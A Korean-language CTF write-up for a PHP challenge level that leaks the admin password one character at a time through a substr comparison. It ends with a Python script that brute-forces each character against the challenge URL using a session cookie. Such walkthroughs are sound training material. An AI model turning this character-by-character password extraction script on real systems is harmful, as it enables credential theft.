<img width="169" alt="스크린샷 2020-01-11 오후 2 12 39" src="https://user-images.githubusercontent.com/54495632/72199224-89c1f400-347c-11ea-8673-1d71cbc5666e.png">

Lv 10.

<img width="715" alt="스크린샷 2020-01-11 오후 2 12 47" src="https://user-images.githubusercontent.com/54495632/72199226-8e86a800-347c-11ea-8620-99d68bc2daea.png">

<img width="721" alt="스크린샷 2020-01-11 오후 2 12 45" src="https://user-images.githubusercontent.com/54495632/72199227-90506b80-347c-11ea-8caa-9b326ddea6e4.png">

$idx = $_GET['idx'];
$ch = $_GET['ch'];
$pw = $_GET['pw'];

idx, ch ,pw 가 get 방식으로 받아진다.

if(!is_numeric($idx) && isset($idx)){ exit("Query is filtered :(");}
if(preg_match('/0x/i', $idx)){ exit("Query is filtered :(");}
if(strlen($ch) > 1){ exit("Query is filtered :(");}
idx 는 숫자여야되며, 값이 존재해야된다.
0x hex가 필터링된다.
$ch의 길이가 1이하만 가능 -> 한글자만 비교가능하다.

#admin's pw : OOOOOOO ( Length is 7 ) ( You Can Guessing!! )
처음에는 파이썬 이용할 생각을 했는데 pw의 길이가 7이니 노가다를 통한 방법으로
각 자리의 pw를 구하라는 문제인것 같다.

$query1 = "select id from play_sql10 where id='admin' and substr(pw,$idx,1)='$ch'";
$ch로 한 글자만 넣을 수 있고 substr(pw,$idx,1) substr함수에서 마지막 파라미터가 1인 것을 보아
한 글자씩 pw를 비교해가며 유추하는 문제이다.

if($result1){
    $query2 = "select id from play_sql10 where id='admin' and pw='$pw'";
    echo "Olleh ~ Admin";
    echo "{$query2}";
    $result2 = mysql_fetch_array(mysql_query($query2, $conn));
    if($result2 && $result2['pw'] == $_GET['pw']){
      echo "C0n9raz!!<br> Letz go 2 th3 n3xt L3v3l ^^";
      get_score();
    }
  }else{
    echo "N0p3..";
  }

$result1에서 한 글자가 맞으면 Olleh ~ Admin 아니면 N0p3 이 출력될 것이다.
$result2에서는 완전히 유추된 Pw를 입력해야 문제가 해결된다.

<img width="740" alt="스크린샷 2020-01-11 오후 2 21 36" src="https://user-images.githubusercontent.com/54495632/72199320-c9d5a680-347d-11ea-9be7-745946d3e978.png">

substr(pw,1,1) 를 통해 pw의 첫 번째 글자와 c를 비교했을 때 성립 -> pw=c~

<img width="729" alt="스크린샷 2020-01-11 오후 2 25 01" src="https://user-images.githubusercontent.com/54495632/72199361-4cf6fc80-347e-11ea-8d98-f89fd90d4257.png">
<img width="732" alt="스크린샷 2020-01-11 오후 2 25 08" src="https://user-images.githubusercontent.com/54495632/72199362-4ec0c000-347e-11ea-9650-ff00358e30ad.png">
<img width="738" alt="스크린샷 2020-01-11 오후 2 25 18" src="https://user-images.githubusercontent.com/54495632/72199363-508a8380-347e-11ea-96f6-29a00789e843.png">
<img width="737" alt="스크린샷 2020-01-11 오후 2 25 25" src="https://user-images.githubusercontent.com/54495632/72199366-54b6a100-347e-11ea-8da2-72a055e2abc8.png">
<img width="746" alt="스크린샷 2020-01-11 오후 2 25 38" src="https://user-images.githubusercontent.com/54495632/72199369-56806480-347e-11ea-8c17-a2dc94a5afed.png">
<img width="778" alt="스크린샷 2020-01-11 오후 2 25 47" src="https://user-images.githubusercontent.com/54495632/72199373-58e2be80-347e-11ea-91ba-cd290d78aeb8.png">

ASCII 함수 없이 고생을 좀 했다. 한 4 글자 찾았을 때, pw가 어느정도 예상이 되서 확인만 했던 것 같다.

pw= crackus , pw는 홈페이지명인 crackus이다.

<img width="542" alt="스크린샷 2020-01-11 오후 2 28 35" src="https://user-images.githubusercontent.com/54495632/72199396-baa32880-347e-11ea-8f97-bf590b0550f1.png">

두 번째 if 를 위한 url 추가

<img width="723" alt="스크린샷 2020-01-11 오후 2 28 44" src="https://user-images.githubusercontent.com/54495632/72199398-c131a000-347e-11ea-9507-d8aac80db84d.png">

첫 번째 $result1에서 TRUE 만 성립하면 가능해서 어떤 것이 와도 관계는 없다.

<img width="307" alt="스크린샷 2020-01-11 오후 4 35 18" src="https://user-images.githubusercontent.com/54495632/72200751-994b3800-3490-11ea-93b8-c81040550164.png">

length 를 찾은 뒤

import requests
pw=''
url ="http://crackus.jeju.kr/chall10.php?"
cookies={'PHPSESSID':'쿠키값필요'}

for i in range(0, 8):
  for j in range(97,128):
       query = "idx="+str(i)+"&ch="+chr(j)
       geturl=url+query
       req = requests.get(geturl,cookies=cookies)
       if((req.text).find("Olleh ~ Admin")>0):
          pw+=chr(j)
          print(pw)
          break
print("Password is "+pw)

다음과 같은 파이썬 코드로 해결 가능하다.
